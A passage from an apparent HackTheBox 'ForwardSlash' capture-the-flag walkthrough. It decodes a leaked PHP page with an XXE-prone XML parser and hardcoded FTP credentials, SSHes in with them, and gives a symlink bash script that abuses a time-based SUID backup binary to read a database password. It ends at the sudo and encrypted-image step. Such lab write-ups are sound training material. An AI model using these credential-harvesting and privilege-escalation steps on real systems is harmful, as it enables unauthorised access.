</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Date: Wed, 06 May 2020 12:20:40 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3361
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Welcome&lt;/title&gt;
    &lt;link rel="stylesheet" href="bootstrap.css"&gt;
    &lt;style type="text/css"&gt;
        body{ font: 14px sans-serif; text-align: center; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="page-header"&gt;
        &lt;h1&gt;Change your Profile Picture!&lt;/h1&gt;
	&lt;font style="color:red"&gt;This has all been disabled while we try to get back on our feet after the hack.&lt;br&gt;&lt;b&gt;-Pain&lt;/b&gt;&lt;/font&gt;
    &lt;/div&gt;
&lt;form action="/profilepicture.php" method="post"&gt;
        URL:
        &lt;input type="text" name="url" disabled style="width:600px"&gt;&lt;br&gt;
        &lt;input style="width:200px" type="submit" value="Submit" disabled&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
</pre></table></code></div></div><h2 id="ssh-with-chiv">SSH with chiv</h2><p>decoding the <code class="language-plaintext highlighter-rouge">base64</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
</pre></table></code></div></div><p>result:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">//include_once ../session.php;</span>
<span class="c1">// Initialize the session</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">true</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"127.0.0.1"</span><span class="p">){</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'HTTP/1.0 403 Forbidden'</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;403 Access Denied&lt;/h1&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;h3&gt;Access Denied From "</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="s2">"&lt;/h3&gt;"</span><span class="p">;</span>
    <span class="c1">//echo "&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;"</span>
    <span class="c1">//echo '&lt;meta http-equiv="refresh" content="3;url=../login.php" /&gt;';</span>
    <span class="c1">//header("location: ../login.php");</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;h1&gt;</span>XML Api Test<span class="nt">&lt;/h1&gt;</span>
	<span class="nt">&lt;h3&gt;</span>This is our api test for when our new website gets refurbished<span class="nt">&lt;/h3&gt;</span>
	<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/dev/index.php"</span> <span class="na">method=</span><span class="s">"get"</span> <span class="na">id=</span><span class="s">"xmltest"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"xml"</span> <span class="na">form=</span><span class="s">"xmltest"</span> <span class="na">rows=</span><span class="s">"20"</span> <span class="na">cols=</span><span class="s">"50"</span><span class="nt">&gt;&lt;api&gt;</span>
    <span class="nt">&lt;request&gt;</span>test<span class="nt">&lt;/request&gt;</span>
<span class="nt">&lt;/api&gt;</span>
<span class="nt">&lt;/textarea&gt;</span>
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;/html&gt;</span>

<span class="c">&lt;!-- TODO:
Fix FTP Login
--&gt;</span>

<span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"GET"</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xml'</span><span class="p">]))</span> <span class="p">{</span>

	<span class="nv">$reg</span> <span class="o">=</span> <span class="s1">'/ftp:\/\/[\s\S]*\/\"/'</span><span class="p">;</span>
	<span class="c1">//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'</span>

	<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$reg</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xml'</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
		<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">];</span>
		<span class="k">echo</span> <span class="nv">$ip</span><span class="p">;</span>
		<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Connecting"</span><span class="p">);</span>

		<span class="nv">$conn_id</span> <span class="o">=</span> <span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't connect to </span><span class="nv">$ip</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

		<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Logging in"</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$conn_id</span><span class="p">,</span> <span class="s2">"chiv"</span><span class="p">,</span> <span class="s1">'N0bodyL1kesBack/'</span><span class="p">))</span> <span class="p">{</span>

			<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Getting file"</span><span class="p">);</span>
			<span class="k">echo</span> <span class="nx">ftp_get_string</span><span class="p">(</span><span class="nv">$conn_id</span><span class="p">,</span> <span class="s2">"debug.txt"</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="k">exit</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="nb">libxml_disable_entity_loader</span> <span class="p">(</span><span class="kc">false</span><span class="p">);</span>
	<span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xml"</span><span class="p">];</span>
	<span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
	<span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$xmlfile</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
	<span class="nv">$api</span> <span class="o">=</span> <span class="nb">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
	<span class="nv">$req</span> <span class="o">=</span> <span class="nv">$api</span><span class="o">-&gt;</span><span class="na">request</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"-----output-----&lt;br&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"</span><span class="nv">$req</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">ftp_get_string</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'php://temp'</span><span class="p">,</span> <span class="s1">'r+'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_fget</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nx">FTP_BINARY</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">rewind</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Good :) Now i have login creds <code class="language-plaintext highlighter-rouge">if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/'))</code><br /> I can ssh with <code class="language-plaintext highlighter-rouge">chiv</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/forward# ssh chiv@forwardslash.htb 
chiv@forwardslash.htb's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 12:26:21 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   30.6% of 19.56GB   Users logged in:      0
  Memory usage: 11%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3
chiv@forwardslash:~$ 
</pre></table></code></div></div><p>Unfortunately it’s not the user .The <code class="language-plaintext highlighter-rouge">user.txt</code> is in <code class="language-plaintext highlighter-rouge">/home/pain</code> so i need to escalate to <code class="language-plaintext highlighter-rouge">pain</code> user</p><h2 id="escalate-to-pain">Escalate to pain</h2><p>I uploaded <code class="language-plaintext highlighter-rouge">linpeas.sh</code> to the box , it shows me <code class="language-plaintext highlighter-rouge">backup</code> files</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>[+] Backup files?
-rw-r----- 1 root backupoperator 1000000000 Mar 24 12:12 /var/backups/recovery/encrypted_backup.img
-rw------- 1 pain pain 526 Jun 21  2019 /var/backups/config.php.bak
-rw-r--r-- 1 root root 0 Mar  5 14:52 /var/lib/apache2/site/enabled_by_admin/backup.forwardslash.htb
-rw-r--r-- 1 root root 799 Mar  5 14:51 /etc/apache2/sites-available/backup.forwardslash.htb.conf
-rw-r--r-- 1 root root 2765 Feb  3 18:24 /etc/apt/sources.list.curtin.old
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
</pre></table></code></div></div><p>i need to read <code class="language-plaintext highlighter-rouge">/var/backups/config.php.bak</code> using <code class="language-plaintext highlighter-rouge">/usr/bin/backup</code> that run as <code class="language-plaintext highlighter-rouge">pain</code> user.<br /> Running <code class="language-plaintext highlighter-rouge">/usr/bin/backup</code> :</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>chiv@forwardslash:/home/pain$ /usr/bin/backup
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:35:30
ERROR: d98e4a958afb7d5d842af2e05ef82aeb Does Not Exist or Is Not Accessible By Me, Exiting...
</pre></table></code></div></div><p>how this backup work ?<br /></p><p><code class="language-plaintext highlighter-rouge">Pain's Next-Gen Time Based Backup Viewer</code>: generate a backup based on system time.<br /> <code class="language-plaintext highlighter-rouge">NOTE: not reading the right file yet,</code>: he need to read a <code class="language-plaintext highlighter-rouge">backup</code> file.<br /> <code class="language-plaintext highlighter-rouge">ERROR: 1ca6831ab789695b2ab8d64c3352107b Does Not Exist or Is Not Accessible By Me, Exiting</code>: he create a file called <code class="language-plaintext highlighter-rouge">d98e4a958afb7d5d842af2e05ef82aeb</code> , this name is generated based on the system time.<br /> If i link this file to <code class="language-plaintext highlighter-rouge">config.php.bak</code> i can read it. I just created a simple <code class="language-plaintext highlighter-rouge">bash</code> script to to the job …<br /> This script will <code class="language-plaintext highlighter-rouge">grep</code> the file name and link it to the <code class="language-plaintext highlighter-rouge">.bak</code> file then run <code class="language-plaintext highlighter-rouge">/usr/bin/backup</code> to read the file at the same time</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nv">t</span><span class="o">=</span><span class="si">$(</span>/usr/bin/backup | <span class="nb">grep </span>ERROR | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span><span class="p">;</span>
<span class="nb">ln</span> <span class="nt">-s</span> /var/backups/config.php.bak ./<span class="nv">$t</span><span class="p">;</span>
/usr/bin/backup<span class="p">;</span>
</pre></table></code></div></div><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">chiv@forwardslash:~$</span><span class="w"> </span>./read.sh 
<span class="go">----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 13:08:12
&lt;?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
</span><span class="gp">define('DB_SERVER', 'localhost');</span><span class="w">
</span><span class="gp">define('DB_USERNAME', 'pain');</span><span class="w">
</span><span class="gp">define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');</span><span class="w">
</span><span class="gp">define('DB_NAME', 'site');</span><span class="w">
</span><span class="go"> 
/* Attempt to connect to MySQL database */
</span><span class="gp">$</span><span class="nb">link</span> <span class="o">=</span> mysqli_connect<span class="o">(</span>DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME<span class="o">)</span><span class="p">;</span>
<span class="go"> 
// Check connection
</span><span class="gp">if($</span><span class="nb">link</span> <span class="o">===</span> <span class="nb">false</span><span class="o">){</span>
<span class="gp">    die("ERROR: Could not connect. " . mysqli_connect_error());</span><span class="w">
</span><span class="go">}
</span><span class="gp">?&gt;</span><span class="w">
</span><span class="gp">chiv@forwardslash:~$</span><span class="w">
</span></pre></table></code></div></div><p>ssh to pain with password <code class="language-plaintext highlighter-rouge">db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/forward# ssh pain@forwardslash.htb 
pain@forwardslash.htb's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 13:33:22 UTC 2020

  System load:  0.0                Processes:            164
  Usage of /:   30.7% of 19.56GB   Users logged in:      0
  Memory usage: 10%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Mar  5 14:22:04 2020 from 192.168.56.1
pain@forwardslash:~$ wc -c user.txt 
33 user.txt
pain@forwardslash:~$ 
</pre></table></code></div></div><p>User owned !!</p><h2 id="own-root">Own root</h2><p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> show that this user can run three commands as root</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
pain@forwardslash:~$ 
</pre></table></code></div></div><p>look like i need to mount an image file . From the enumeration tool</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root backupoperator 1000000000 Mar 24 12:12 /var/backups/recovery/encrypted_backup.img
